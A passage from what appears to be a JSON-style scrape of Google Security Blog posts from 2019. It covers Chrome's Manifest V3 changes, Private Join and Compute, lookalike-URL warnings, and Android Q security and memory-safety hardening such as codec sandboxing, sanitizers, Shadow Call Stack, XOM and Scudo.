photos, and access to social media accounts. As we make these changes we want to continue to support extensions in empowering users and enhancing their browsing experience.  To help with this balance, we’re reimagining the way a number of powerful APIs work. Instead of a user granting each extension access to all of their sensitive data, we are creating ways for developers to request access to only the data they need to accomplish the same functionality. One example of this is the introduction of the Declarative Net Request API, which is replacing parts of the Web Request API.  At a high level, this change means that an extension does not need access to all a user’s sensitive data in order to block content. With the current Web Request API, users grant permission for Chrome to pass all information about a network request - which can include things like emails, photos, or other private information - to the extension. In contrast, the Declarative Net Request API allows extensions to block content without requiring the user to grant access to any sensitive information. Additionally, because we are able to cut substantial overhead in the browser, the Declarative Net Request API can have significant, system-level performance benefits over Web Request.      This has been a controversial change since the Web Request API is used by many popular extensions, including ad blockers. We are not preventing the development of ad blockers or stopping users from blocking ads. Instead, we want to help developers, including content blockers, write extensions in a way that protects users’ privacy.  You can read more about the Declarative Net Request API and how it compares to the Web Request API here.  We understand that these changes will require developers to update the way in which their extensions operate. However, we think it is the right choice to enable users to limit the sensitive data they share with third-parties while giving them the ability to curate their own browsing experience. We are continuing to iterate on many aspects of the Manifest V3 design, and are working with the developer community to find solutions that both solve the use cases extensions have today and keep our users safe and in control.       ", "date": "June 12, 2019"},
{"website": "Google-Security", "title": "\nHelping organizations do more without collecting more data\n", "author": ["Posted by Amanda Walker, Engineering Director; Sarvar Patel, Software Engineer; and Moti Yung, Research Scientist, Private Computing"], "link": "https://security.googleblog.com/2019/06/helping-organizations-do-more-without-collecting-more-data.html", "abstract": "                             Posted by Amanda Walker, Engineering Director; Sarvar Patel, Software Engineer; and Moti Yung, Research Scientist, Private Computing     We continually  invest in new research  to advance innovations that preserve individual privacy while enabling valuable insights from data. Earlier this year, we launched  Password Checkup , a Chrome extension that helps users detect if a username and password they enter on a website has been compromised. It relies on a cryptographic protocol known as  private set intersection (PSI)  to match your login&#8217;s credentials against an encrypted database of over 4 billion credentials Google knows to be unsafe. At the same time, it ensures that no one &#8211; including Google &#8211; ever learns your actual credentials.    Today, we&#8217;re rolling out the  open-source availability &nbsp;of Private Join and Compute, a new type of  secure multi-party computation  (MPC) that augments the core PSI protocol to help organizations work together with confidential data sets while raising the bar for privacy.          Collaborating with data in privacy-safe ways   Many important research, business, and social questions can be answered by combining data sets from independent parties where each party holds their own information about a set of shared identifiers (e.g. email addresses), some of which are common. But when you&#8217;re working with sensitive data, how can one party gain aggregated insights about the other party&#8217;s data without either of them learning any information about individuals in the datasets? That&#8217;s the exact challenge that Private Join and Compute helps solve.    Using this cryptographic protocol, two parties can encrypt their identifiers and associated data, and then join them. They can then do certain types of calculations on the overlapping set of data to draw useful information from both datasets in aggregate. All inputs (identifiers and their associated data) remain fully encrypted and unreadable throughout the process. Neither party ever reveals their raw data, but they can still answer the questions at hand using the output of the computation. This end result is the only thing that&#8217;s decrypted and shared in the form of aggregated statistics. For example, this could be a count, sum, or average of the data in both sets.           A deeper look at the technology &nbsp;     Private Join and Compute combines two fundamental cryptographic techniques to protect individual data:        Private set intersection  allows two parties to privately join their sets and discover the identifiers they have in common. We use an oblivious variant which only marks encrypted identifiers without learning any of the identifiers.    Homomorphic encryption  allows certain types of computation to be performed directly on encrypted data without having to decrypt it first, which preserves the privacy of raw data. Throughout the process, individual identifiers and values remain concealed. For example, you can count how many identifiers are in the common set or compute the sum of values associated with marked encrypted identifiers &#8211; without learning anything about individuals.&nbsp;      This combination of techniques ensures that nothing but the size of the joined set and the statistics (e.g. sum) of its associated values is revealed. Individual items are strongly encrypted with random keys throughout and are not available in raw form to the other party or anyone else.    Watch this video or click to view the full  infographic  below on how Private Join and Compute works:                            Using multi-party computation to solve real-world problems     Multi-party computation (MPC) is a field with a long history, but it has typically faced many hurdles to widespread adoption beyond academic communities. Common challenges include finding effective and efficient ways to tailor encryption techniques and tools to solve practical problems.    We&#8217;re committed to applying MPC and encryption technologies to more concrete, real-world issues at Google and beyond by  making privacy technology more widely available . We are exploring a number of potential use cases at Google across  collaborative machine learning , user security, and aggregated ads measurement.    And this is just the beginning of what&#8217;s possible. This technology can help advance valuable research in a wide array of fields that require organizations to work together without revealing anything about individuals represented in the data. For example:             Public policy  - if a government implements new wellness initiatives in public schools (e.g. better lunch options and physical education curriculums), what are the long-term health outcomes for impacted students?    Diversity and inclusion  - when industries create new programs to close gender and racial pay gaps, how does this impact compensation across companies by demographic?    Healthcare  - when a new preventative drug is prescribed to patients across the country, does it reduce the incidence of disease?&nbsp;    Car safety standards  - when auto manufacturers add more advanced safety features to vehicles, does it coincide with a decrease in reported car accidents?        Private Join and Compute keeps individual information safe while allowing organizations to accurately compute and draw useful insights from aggregate statistics. By sharing the technology more widely, we hope this expands the use cases for secure computing. To learn more about the research and methodology behind Private Join and Compute,  read the full paper  and  access the open source code and documentation . We&#8217;re excited to see how other organizations will advance MPC and cryptography to answer important questions while upholding individual privacy.          Acknowledgements      Product Manager - Nirdhar Khazanie  Software Engineers - Mihaela Ion, Benjamin Kreuter, Erhan Nergiz, Quan Nguyen, and Karn Seth  Research Scientist - Mariana Raykova                                            Posted by Amanda Walker, Engineering Director; Sarvar Patel, Software Engineer; and Moti Yung, Research Scientist, Private Computing  We continually invest in new research to advance innovations that preserve individual privacy while enabling valuable insights from data. Earlier this year, we launched Password Checkup, a Chrome extension that helps users detect if a username and password they enter on a website has been compromised. It relies on a cryptographic protocol known as private set intersection (PSI) to match your login’s credentials against an encrypted database of over 4 billion credentials Google knows to be unsafe. At the same time, it ensures that no one – including Google – ever learns your actual credentials.  Today, we’re rolling out the open-source availability of Private Join and Compute, a new type of secure multi-party computation (MPC) that augments the core PSI protocol to help organizations work together with confidential data sets while raising the bar for privacy.     Collaborating with data in privacy-safe ways Many important research, business, and social questions can be answered by combining data sets from independent parties where each party holds their own information about a set of shared identifiers (e.g. email addresses), some of which are common. But when you’re working with sensitive data, how can one party gain aggregated insights about the other party’s data without either of them learning any information about individuals in the datasets? That’s the exact challenge that Private Join and Compute helps solve.  Using this cryptographic protocol, two parties can encrypt their identifiers and associated data, and then join them. They can then do certain types of calculations on the overlapping set of data to draw useful information from both datasets in aggregate. All inputs (identifiers and their associated data) remain fully encrypted and unreadable throughout the process. Neither party ever reveals their raw data, but they can still answer the questions at hand using the output of the computation. This end result is the only thing that’s decrypted and shared in the form of aggregated statistics. For example, this could be a count, sum, or average of the data in both sets.     A deeper look at the technology   Private Join and Compute combines two fundamental cryptographic techniques to protect individual data:   Private set intersection allows two parties to privately join their sets and discover the identifiers they have in common. We use an oblivious variant which only marks encrypted identifiers without learning any of the identifiers. Homomorphic encryption allows certain types of computation to be performed directly on encrypted data without having to decrypt it first, which preserves the privacy of raw data. Throughout the process, individual identifiers and values remain concealed. For example, you can count how many identifiers are in the common set or compute the sum of values associated with marked encrypted identifiers – without learning anything about individuals.    This combination of techniques ensures that nothing but the size of the joined set and the statistics (e.g. sum) of its associated values is revealed. Individual items are strongly encrypted with random keys throughout and are not available in raw form to the other party or anyone else.  Watch this video or click to view the full infographic below on how Private Join and Compute works:            Using multi-party computation to solve real-world problems  Multi-party computation (MPC) is a field with a long history, but it has typically faced many hurdles to widespread adoption beyond academic communities. Common challenges include finding effective and efficient ways to tailor encryption techniques and tools to solve practical problems.  We’re committed to applying MPC and encryption technologies to more concrete, real-world issues at Google and beyond by making privacy technology more widely available. We are exploring a number of potential use cases at Google across collaborative machine learning, user security, and aggregated ads measurement.  And this is just the beginning of what’s possible. This technology can help advance valuable research in a wide array of fields that require organizations to work together without revealing anything about individuals represented in the data. For example:     Public policy - if a government implements new wellness initiatives in public schools (e.g. better lunch options and physical education curriculums), what are the long-term health outcomes for impacted students? Diversity and inclusion - when industries create new programs to close gender and racial pay gaps, how does this impact compensation across companies by demographic? Healthcare - when a new preventative drug is prescribed to patients across the country, does it reduce the incidence of disease?  Car safety standards - when auto manufacturers add more advanced safety features to vehicles, does it coincide with a decrease in reported car accidents?    Private Join and Compute keeps individual information safe while allowing organizations to accurately compute and draw useful insights from aggregate statistics. By sharing the technology more widely, we hope this expands the use cases for secure computing. To learn more about the research and methodology behind Private Join and Compute, read the full paper and access the open source code and documentation. We’re excited to see how other organizations will advance MPC and cryptography to answer important questions while upholding individual privacy.    Acknowledgements  Product Manager - Nirdhar Khazanie Software Engineers - Mihaela Ion, Benjamin Kreuter, Erhan Nergiz, Quan Nguyen, and Karn Seth Research Scientist - Mariana Raykova        ", "date": "June 19, 2019"},
{"website": "Google-Security", "title": "\nNew Chrome Protections from Deception\n", "author": ["Posted by Emily Schechter, Chrome Product Manager\n"], "link": "https://security.googleblog.com/2019/06/new-chrome-protections-from-deception.html", "abstract": "                             Posted by Emily Schechter, Chrome Product Manager     Chrome was built with security in mind from the very beginning. Today we&#8217;re launching two new features to help protect users from deceptive websites. The Suspicious Site Reporter Extension will improve security for Chrome users by giving power users an easy way to report suspicious sites to Google Safe Browsing. We&#8217;re also launching a new warning to protect users from sites with deceptive URLs.     We designed Chrome to be secure by default, and easy to use by everyone. Google Safe Browsing has helped protect Chrome users from phishing attacks for over 10 years, and now helps protect more than 4 billion devices every day across multiple browsers and apps by showing warnings to people before they visit dangerous sites or download dangerous files. We&#8217;re constantly improving Safe Browsing, and now you can help.     Safe Browsing works by automatically analyzing the websites that we know about through Google Search&#8217;s web crawlers, and creating lists of sites that are dangerous or deceptive. With the  Suspicious Site Reporter extension , you can help Safe Browsing protect web users by reporting suspicious sites. You can install the extension to start seeing an icon when you&#8217;re on a potentially suspicious site, and more information about why the site might be suspicious. By clicking the icon, you&#8217;re now able to report unsafe sites to Safe Browsing for further evaluation. If the site is added to Safe Browsing&#8217;s lists, you&#8217;ll not only protect Chrome users, but users of other browsers and across the entire web.                 Help us protect web users by reporting dangerous or deceptive sites to Google Safe Browsing through the Suspicious Site Reporter extension.         One way that deceptive sites might try to trick you is by using a confusing URL. For example, it&#8217;s easy to confuse &#8220;go0gle.com&#8221; with &#8220;google.com&#8221;. In Chrome 75, we&#8217;re launching a new warning to direct users away from sites that have confusing URLs.                 Starting in the current version of Chrome (75), you&#8217;ll see a warning when the page URL might be confused for URLs of sites you&#8217;ve visited recently.           This new warning works by comparing the URL of the page you&#8217;re currently on to URLs of pages you&#8217;ve recently visited. If the URL looks similar, and might cause you to be confused or deceived, we&#8217;ll show a warning that helps you get back to safety.      We believe that you shouldn't have to be a security expert to feel safe on the web, and that many Chrome power-users share our mission to make the web more secure for everyone. We&#8217;ll continue improving Chrome Security to help make Chrome easy to use safely, and are looking forward to collaborating with the community to further that goal. If you'd like to help out,  install the new extension  and start helping protect the web!                                     Posted by Emily Schechter, Chrome Product Manager   Chrome was built with security in mind from the very beginning. Today we’re launching two new features to help protect users from deceptive websites. The Suspicious Site Reporter Extension will improve security for Chrome users by giving power users an easy way to report suspicious sites to Google Safe Browsing. We’re also launching a new warning to protect users from sites with deceptive URLs.   We designed Chrome to be secure by default, and easy to use by everyone. Google Safe Browsing has helped protect Chrome users from phishing attacks for over 10 years, and now helps protect more than 4 billion devices every day across multiple browsers and apps by showing warnings to people before they visit dangerous sites or download dangerous files. We’re constantly improving Safe Browsing, and now you can help.   Safe Browsing works by automatically analyzing the websites that we know about through Google Search’s web crawlers, and creating lists of sites that are dangerous or deceptive. With the Suspicious Site Reporter extension, you can help Safe Browsing protect web users by reporting suspicious sites. You can install the extension to start seeing an icon when you’re on a potentially suspicious site, and more information about why the site might be suspicious. By clicking the icon, you’re now able to report unsafe sites to Safe Browsing for further evaluation. If the site is added to Safe Browsing’s lists, you’ll not only protect Chrome users, but users of other browsers and across the entire web.       Help us protect web users by reporting dangerous or deceptive sites to Google Safe Browsing through the Suspicious Site Reporter extension.   One way that deceptive sites might try to trick you is by using a confusing URL. For example, it’s easy to confuse “go0gle.com” with “google.com”. In Chrome 75, we’re launching a new warning to direct users away from sites that have confusing URLs.       Starting in the current version of Chrome (75), you’ll see a warning when the page URL might be confused for URLs of sites you’ve visited recently.    This new warning works by comparing the URL of the page you’re currently on to URLs of pages you’ve recently visited. If the URL looks similar, and might cause you to be confused or deceived, we’ll show a warning that helps you get back to safety.   We believe that you shouldn't have to be a security expert to feel safe on the web, and that many Chrome power-users share our mission to make the web more secure for everyone. We’ll continue improving Chrome Security to help make Chrome easy to use safely, and are looking forward to collaborating with the community to further that goal. If you'd like to help out, install the new extension and start helping protect the web!      ", "date": "June 18, 2019"},
{"website": "Google-Security", "title": "\nWhat’s New in Android Q Security\n", "author": [], "link": "https://security.googleblog.com/2019/05/whats-new-in-android-q-security.html", "abstract": "                                    Posted by Rene Mayrhofer and Xiaowen Xin, Android Security & Privacy Team      [Cross-posted from the  Android Developers Blog ]         With every new version of Android, one of our top priorities is raising the bar for security. Over the last few years, these improvements have led to measurable progress across the ecosystem, and 2018 was no different.      In the 4th quarter of 2018, we had 84% more devices receiving a security update than in the same quarter the prior year. At the same time, no critical security vulnerabilities affecting the Android platform were publicly disclosed without a security update or mitigation available in 2018, and we saw a 20% year-over-year decline in the proportion of devices that installed a  Potentially Harmful App . In the spirit of transparency, we released this data and more in our  Android Security & Privacy 2018 Year In Review.      But now you may be asking, what&#8217;s next?      Today at Google I/O we lifted the curtain on all the new security features being integrated into Android Q. We plan to go deeper on each feature in the coming weeks and months, but first wanted to share a quick summary of all the security goodness we&#8217;re adding to the platform.       Encryption      Storage encryption is one of the most fundamental (and effective) security technologies, but current encryption standards require devices have cryptographic acceleration hardware. Because of this requirement many devices are not capable of using storage encryption. The launch of Adiantum changes that in the Android Q release. We announced  Adiantum  in February. Adiantum is designed to run efficiently without specialized hardware, and can work across everything from smart watches to internet-connected medical devices.     Our commitment to the importance of encryption continues with the Android Q release. All compatible Android devices newly launching with Android Q are required to encrypt user data, with no exceptions. This includes phones, tablets, televisions, and automotive devices. This will ensure the next generation of devices are more secure than their predecessors, and allow the next billion people coming online for the first time to do so safely.      However, storage encryption is just one half of the picture, which is why we are also enabling TLS 1.3 support by default in Android Q. TLS 1.3 is a major revision to the TLS standard finalized by the IETF in August 2018. It is faster, more secure, and more private.  TLS 1.3 can often complete the handshake in fewer roundtrips, making the connection time up to 40% faster for those sessions. From a security perspective, TLS 1.3 removes support for weaker cryptographic algorithms, as well as some insecure or obsolete features. It uses a newly-designed handshake which fixes several weaknesses in TLS 1.2. The new protocol is cleaner, less error prone, and more resilient to key compromise. Finally, from a privacy perspective, TLS 1.3 encrypts more of the handshake to better protect the identities of the participating parties.      Platform Hardening       Android utilizes a strategy of defense-in-depth to ensure that individual implementation bugs are insufficient for bypassing our security systems. We apply process isolation, attack surface reduction, architectural decomposition, and exploit mitigations to render vulnerabilities more difficult or impossible to exploit, and to increase the number of vulnerabilities needed by an attacker to achieve their goals.     In Android Q, we have applied these strategies to security critical areas such as media, Bluetooth, and the kernel. We describe these improvements more extensively in a separate  blog post , but some highlights include:       A constrained sandbox for software codecs.   Increased production use of sanitizers to mitigate entire classes of vulnerabilities in components that process untrusted content.   Shadow Call Stack, which provides backward-edge Control Flow Integrity (CFI) and complements the forward-edge protection provided by LLVM&#8217;s CFI.   Protecting Address Space Layout Randomization (ASLR) against leaks using eXecute-Only Memory (XOM).   Introduction of Scudo hardened allocator which makes a number of heap related vulnerabilities more difficult to exploit.         Authentication      Android Pie introduced the BiometricPrompt API to help apps utilize biometrics, including face, fingerprint, and iris. Since the launch, we&#8217;ve seen a lot of apps embrace the new API, and now with Android Q, we&#8217;ve updated the underlying framework with robust support for face and fingerprint. Additionally, we expanded the API to support additional use-cases, including both implicit and explicit authentication.     In the explicit flow, the user must perform an action to proceed, such as tap their finger to the fingerprint sensor.  If they&#8217;re using face or iris to authenticate, then the user must click an additional button to proceed. The explicit flow is the default flow and should be used for all high-value transactions such as payments.     Implicit flow does not require an additional user action. It is used to provide a lighter-weight, more seamless experience for transactions that are readily and easily reversible, such as sign-in and autofill.      Another handy new feature in BiometricPrompt is the ability to check if a device supports biometric authentication prior to invoking BiometricPrompt. This is useful when the app wants to show an &#8220;enable biometric sign-in&#8221; or similar item in their sign-in page or in-app settings menu.  To support this, we&#8217;ve added a new  BiometricManager  class. You can now call the  canAuthenticate()  method in it to determine whether the device supports biometric authentication and whether the user is enrolled.      What&#8217;s Next?      Beyond Android Q, we are looking to add Electronic ID support for mobile apps, so that your phone can be used as an ID, such as a driver&#8217;s license. Apps such as these have a lot of security requirements and involves integration between the client application on the holder&#8217;s mobile phone, a reader/verifier device, and issuing authority backend systems used for license issuance, updates, and revocation.      This initiative requires expertise around cryptography and standardization from the  ISO  and is being led by the Android Security and Privacy team. We will be providing APIs and a reference implementation of HALs for Android devices in order to ensure the platform provides the building blocks for similar security and privacy sensitive applications. You can expect to hear more updates from us on Electronic ID support in the near future.    Acknowledgements: This post leveraged contributions from Jeff Vander Stoep and Shawn Willden                                           Posted by Rene Mayrhofer and Xiaowen Xin, Android Security & Privacy Team   [Cross-posted from the Android Developers Blog]   With every new version of Android, one of our top priorities is raising the bar for security. Over the last few years, these improvements have led to measurable progress across the ecosystem, and 2018 was no different.    In the 4th quarter of 2018, we had 84% more devices receiving a security update than in the same quarter the prior year. At the same time, no critical security vulnerabilities affecting the Android platform were publicly disclosed without a security update or mitigation available in 2018, and we saw a 20% year-over-year decline in the proportion of devices that installed a Potentially Harmful App. In the spirit of transparency, we released this data and more in our Android Security & Privacy 2018 Year In Review.   But now you may be asking, what’s next?    Today at Google I/O we lifted the curtain on all the new security features being integrated into Android Q. We plan to go deeper on each feature in the coming weeks and months, but first wanted to share a quick summary of all the security goodness we’re adding to the platform.    Encryption   Storage encryption is one of the most fundamental (and effective) security technologies, but current encryption standards require devices have cryptographic acceleration hardware. Because of this requirement many devices are not capable of using storage encryption. The launch of Adiantum changes that in the Android Q release. We announced Adiantum in February. Adiantum is designed to run efficiently without specialized hardware, and can work across everything from smart watches to internet-connected medical devices.   Our commitment to the importance of encryption continues with the Android Q release. All compatible Android devices newly launching with Android Q are required to encrypt user data, with no exceptions. This includes phones, tablets, televisions, and automotive devices. This will ensure the next generation of devices are more secure than their predecessors, and allow the next billion people coming online for the first time to do so safely.    However, storage encryption is just one half of the picture, which is why we are also enabling TLS 1.3 support by default in Android Q. TLS 1.3 is a major revision to the TLS standard finalized by the IETF in August 2018. It is faster, more secure, and more private.  TLS 1.3 can often complete the handshake in fewer roundtrips, making the connection time up to 40% faster for those sessions. From a security perspective, TLS 1.3 removes support for weaker cryptographic algorithms, as well as some insecure or obsolete features. It uses a newly-designed handshake which fixes several weaknesses in TLS 1.2. The new protocol is cleaner, less error prone, and more resilient to key compromise. Finally, from a privacy perspective, TLS 1.3 encrypts more of the handshake to better protect the identities of the participating parties.   Platform Hardening    Android utilizes a strategy of defense-in-depth to ensure that individual implementation bugs are insufficient for bypassing our security systems. We apply process isolation, attack surface reduction, architectural decomposition, and exploit mitigations to render vulnerabilities more difficult or impossible to exploit, and to increase the number of vulnerabilities needed by an attacker to achieve their goals.   In Android Q, we have applied these strategies to security critical areas such as media, Bluetooth, and the kernel. We describe these improvements more extensively in a separate blog post, but some highlights include:    A constrained sandbox for software codecs.  Increased production use of sanitizers to mitigate entire classes of vulnerabilities in components that process untrusted content.  Shadow Call Stack, which provides backward-edge Control Flow Integrity (CFI) and complements the forward-edge protection provided by LLVM’s CFI.  Protecting Address Space Layout Randomization (ASLR) against leaks using eXecute-Only Memory (XOM).  Introduction of Scudo hardened allocator which makes a number of heap related vulnerabilities more difficult to exploit.     Authentication   Android Pie introduced the BiometricPrompt API to help apps utilize biometrics, including face, fingerprint, and iris. Since the launch, we’ve seen a lot of apps embrace the new API, and now with Android Q, we’ve updated the underlying framework with robust support for face and fingerprint. Additionally, we expanded the API to support additional use-cases, including both implicit and explicit authentication.   In the explicit flow, the user must perform an action to proceed, such as tap their finger to the fingerprint sensor.  If they’re using face or iris to authenticate, then the user must click an additional button to proceed. The explicit flow is the default flow and should be used for all high-value transactions such as payments.   Implicit flow does not require an additional user action. It is used to provide a lighter-weight, more seamless experience for transactions that are readily and easily reversible, such as sign-in and autofill.    Another handy new feature in BiometricPrompt is the ability to check if a device supports biometric authentication prior to invoking BiometricPrompt. This is useful when the app wants to show an “enable biometric sign-in” or similar item in their sign-in page or in-app settings menu.  To support this, we’ve added a new BiometricManager class. You can now call the canAuthenticate() method in it to determine whether the device supports biometric authentication and whether the user is enrolled.   What’s Next?   Beyond Android Q, we are looking to add Electronic ID support for mobile apps, so that your phone can be used as an ID, such as a driver’s license. Apps such as these have a lot of security requirements and involves integration between the client application on the holder’s mobile phone, a reader/verifier device, and issuing authority backend systems used for license issuance, updates, and revocation.    This initiative requires expertise around cryptography and standardization from the ISO and is being led by the Android Security and Privacy team. We will be providing APIs and a reference implementation of HALs for Android devices in order to ensure the platform provides the building blocks for similar security and privacy sensitive applications. You can expect to hear more updates from us on Electronic ID support in the near future.  Acknowledgements: This post leveraged contributions from Jeff Vander Stoep and Shawn Willden      ", "date": "May 9, 2019"},
{"website": "Google-Security", "title": "\nQueue the Hardening Enhancements\n", "author": [], "link": "https://security.googleblog.com/2019/05/queue-hardening-enhancements.html", "abstract": "                                    Posted by Jeff Vander Stoep, Android Security & Privacy Team and Chong Zhang, Android Media Team     [Cross-posted from the  Android Developers Blog ]          Android Q Beta versions are now publicly  available . Among the various new features introduced in Android Q are some important security hardening changes. While exciting  new security features  are added in each Android release, hardening generally refers to security improvements made to existing components.     When prioritizing platform hardening, we analyze data from a number of sources including our  vulnerability rewards program  (VRP). Past security issues provide useful insight into which components can use additional hardening. Android publishes  monthly security bulletins  which include fixes for all the high/critical severity vulnerabilities in the Android Open Source Project (AOSP) reported through our VRP. While fixing vulnerabilities is necessary, we also get a lot of value from the metadata - analysis on the location and class of vulnerabilities. With this insight we can apply the following strategies to our existing components:       Contain: isolating and de-privileging components, particularly ones that handle untrusted content. This includes:       Access control: adding permission checks, increasing the granularity of permission checks, or switching to safer defaults (for example, default deny).    Attack surface reduction: reducing the number of entry/exit points (i.e. principle of least privilege).    Architectural decomposition: breaking privileged processes into less privileged components and applying attack surface reduction.        Mitigate: Assume vulnerabilities exist and actively defend against classes of vulnerabilities or common exploitation techniques.       Here&#8217;s a look at high severity vulnerabilities by component and cause from 2018:                Most of Android&#8217;s vulnerabilities occur in the media and bluetooth components. Use-after-free (UAF), integer overflows, and out of bounds (OOB) reads/writes comprise 90% of vulnerabilities with OOB being the most common.    A Constrained Sandbox for Software Codecs      In Android Q, we moved software codecs out of the main mediacodec service into a  constrained sandbox . This is a big step forward in our effort to improve security by isolating various media components into less privileged sandboxes. As Mark Brand of Project Zero points out in his  Return To Libstagefright  blog post, constrained sandboxes are not where an attacker wants to end up. In 2018, approximately 80% of the critical/high severity vulnerabilities in media components occurred in software codecs, meaning further isolating them is a big improvement. Due to the increased protection provided by the new mediaswcodec sandbox, these same vulnerabilities will receive a lower severity based on Android&#8217;s  severity guidelines .     The following figure shows an overview of the evolution of media services layout in the recent Android releases.        Prior to N, media services are all inside one monolithic mediaserver process, and the extractors run inside the client.    In N, we delivered a major  security re-architect , where a number of lower-level media services are spun off into individual service processes with reduced privilege sandboxes. Extractors are moved into server side, and put into a constrained sandbox. Only a couple of higher-level functionalities remained in mediaserver itself.   In O, the services are &#8220; treblized ,&#8221; and further deprivileged that is, separated into individual sandboxes and converted into HALs. The media.codec service became a HAL while still hosting both software and hardware codec implementations.    In Q, the software codecs are extracted from the media.codec process, and moved back to system side. It becomes a system service that exposes the codec HAL interface. Selinux policy and seccomp filters are further tightened up for this process. In particular, while the previous mediacodec process had access to device drivers for hardware accelerated codecs, the software codec process has no access to device drivers.              With this move, we now have the two primary sources for media vulnerabilities tightly sandboxed within constrained processes. Software codecs are similar to extractors in that they both have extensive code parsing bitstreams from untrusted sources. Once a vulnerability is identified in the source code, it can be triggered by sending a crafted media file to media APIs (such as MediaExtractor or MediaCodec). Sandboxing these two services allows us to reduce the severity of potential security vulnerabilities without compromising performance.     In addition to constraining riskier codecs, a lot of work has also gone into preventing common types of vulnerabilities.    Bound Sanitizer      Incorrect or missing memory bounds checking on arrays account for about 34% of Android&#8217;s userspace vulnerabilities. In cases where the array size is known at compile time, LLVM&#8217;s bound sanitizer (BoundSan) can automatically instrument arrays to prevent overflows and fail safely.           BoundSan instrumentation    BoundSan is enabled in 11 media codecs and throughout the Bluetooth stack for Android Q. By optimizing away a number of  unnecessary   checks  the performance overhead was reduced to less than 1%. BoundSan has already found/prevented potential vulnerabilities in codecs and Bluetooth.    More integer sanitizer in more places      Android  pioneered  the production use of sanitizers in Android Nougat when we first started rolling out integer sanization (IntSan) in the media frameworks. This work has continued with each release and has been very successful in preventing otherwise exploitable vulnerabilities. For example, new IntSan coverage in Android Pie mitigated 11 critical vulnerabilities. Enabling IntSan is challenging because overflows are generally benign and unsigned integer overflows are well defined and sometimes intentional. This is quite different from the bound sanitizer where OOB reads/writes are always unintended and often exploitable. Enabling Intsan has been a multi year project, but with Q we have fully enabled it across the media frameworks with the inclusion of 11 more codecs.            IntSan Instrumentation    IntSan works by instrumenting arithmetic operations to abort when an overflow occurs. This instrumentation can have an impact on performance, so evaluating the impact on CPU usage is necessary. In cases where performance impact was too high, we identified hot functions and individually disabled IntSan on those functions after manually reviewing them for integer safety.     BoundSan and IntSan are considered strong mitigations because (where applied) they prevent the root cause of memory safety vulnerabilities. The class of mitigations described next target common exploitation techniques. These mitigations are considered to be probabilistic because they make exploitation more difficult by limiting how a vulnerability may be used.     Shadow Call Stack      LLVM&#8217;s Control Flow Integrity (CFI) was enabled in the media frameworks, Bluetooth, and NFC in  Android Pie . CFI makes code reuse attacks more difficult by protecting the forward-edges of the call graph, such as function pointers and virtual functions. Android Q uses LLVM&#8217;s Shadow Call Stack (SCS) to protect return addresses, protecting the backwards-edge of control flow graph. SCS accomplishes this by storing return addresses in a separate shadow stack which is protected from leakage by storing its location in the x18 register, which is now reserved by the compiler.            SCS Instrumentation    SCS has negligible performance overhead and a small memory increase due to the separate stack. In Android Q, SCS has been turned on in portions of the Bluetooth stack and is also available for the kernel. We&#8217;ll share more on that in an upcoming post.    eXecute-Only Memory      Like SCS, eXecute-Only Memory (XOM) aims at making common exploitation techniques more expensive. It does so by strengthening the protections already provided by address space layout randomization (ASLR) which in turn makes code reuse attacks more difficult by requiring attackers to first leak the location of the code they intend to reuse. This often means that an attacker now needs two vulnerabilities, a read primitive and a write primitive, where previously just a write primitive was necessary in order to achieve their goals. XOM protects against leaks (memory disclosures of code segments) by making code unreadable. Attempts to read execute-only code results in the process aborting safely.            Tombstone from a XOM abort    Starting in Android Q, platform-provided AArch64 code segments in binaries and libraries are loaded as execute-only. Not all devices will immediately receive the benefit as this enforcement has hardware dependencies (ARMv8.2+) and kernel dependencies (Linux 4.9+, CONFIG_ARM64_UAO). For apps with a targetSdkVersion lower than Q, Android&#8217;s zygote process will relax the protection in order to avoid potential app breakage, but 64 bit system processes (for example, mediaextractor, init, vold, etc.) are protected. XOM protections are applied at compile-time and have no memory or CPU overhead.    Scudo Hardened Allocator      Scudo is a dynamic heap allocator designed to be resilient against heap related vulnerabilities such as:       Use-after-frees: by quarantining freed blocks.   Double-frees: by tracking chunk states.   Buffer overflows: by check summing headers.   Heap sprays and layout manipulation: by improved randomization.     Scudo does not prevent exploitation but rather proactively manages memory in a way to make exploitation more difficult. It is configurable on a per-process basis depending on performance requirements. Scudo is enabled in extractors and codecs in the media frameworks.           Tombstone from Scudo aborts   Contributing security improvements to Open Source      AOSP makes use of a number of Open Source Projects to build and secure Android. Google is actively contributing back to these projects in a number of security critical areas:       Creator and primary contributor to  AddressSanitizer  and other \" sanitizer \" (compiler-based dynamic testing tools) to LLVM.   Primary contributor to compiler-based hardening tools in LLVM ( ControlFlowIntegrity ,  ShadowCallStack ).   Creator of fuzzing tools ( AFL ,  libFuzzer ,  honggfuzz ,  syzkaller ) and fuzzing infrastructure ( oss-fuzz ,  syzbot ) for user-space and OS kernels.    Participant  in research related to  hardware-assisted memory safety .   Primary contributor of the  Scudo hardened allocator  to LLVM.      Thank you to Ivan Lozano, Kevin Deus, Kostya Kortchinsky, Kostya Serebryany, and Mike Antares for their contributions to this post.                                             Posted by Jeff Vander Stoep, Android Security & Privacy Team and Chong Zhang, Android Media Team  [Cross-posted from the Android Developers Blog]    Android Q Beta versions are now publicly available. Among the various new features introduced in Android Q are some important security hardening changes. While exciting new security features are added in each Android release, hardening generally refers to security improvements made to existing components.   When prioritizing platform hardening, we analyze data from a number of sources including our vulnerability rewards program (VRP). Past security issues provide useful insight into which components can use additional hardening. Android publishes monthly security bulletins which include fixes for all the high/critical severity vulnerabilities in the Android Open Source Project (AOSP) reported through our VRP. While fixing vulnerabilities is necessary, we also get a lot of value from the metadata - analysis on the location and class of vulnerabilities. With this insight we can apply the following strategies to our existing components:    Contain: isolating and de-privileging components, particularly ones that handle untrusted content. This includes:     Access control: adding permission checks, increasing the granularity of permission checks, or switching to safer defaults (for example, default deny).   Attack surface reduction: reducing the number of entry/exit points (i.e. principle of least privilege).   Architectural decomposition: breaking privileged processes into less privileged components and applying attack surface reduction.     Mitigate: Assume vulnerabilities exist and actively defend against classes of vulnerabilities or common exploitation techniques.    Here’s a look at high severity vulnerabilities by component and cause from 2018:      Most of Android’s vulnerabilities occur in the media and bluetooth components. Use-after-free (UAF), integer overflows, and out of bounds (OOB) reads/writes comprise 90% of vulnerabilities with OOB being the most common.  A Constrained Sandbox for Software Codecs    In Android Q, we moved software codecs out of the main mediacodec service into a constrained sandbox. This is a big step forward in our effort to improve security by isolating various media components into less privileged sandboxes. As Mark Brand of Project Zero points out in his Return To Libstagefright blog post, constrained sandboxes are not where an attacker wants to end up. In 2018, approximately 80% of the critical/high severity vulnerabilities in media components occurred in software codecs, meaning further isolating them is a big improvement. Due to the increased protection provided by the new mediaswcodec sandbox, these same vulnerabilities will 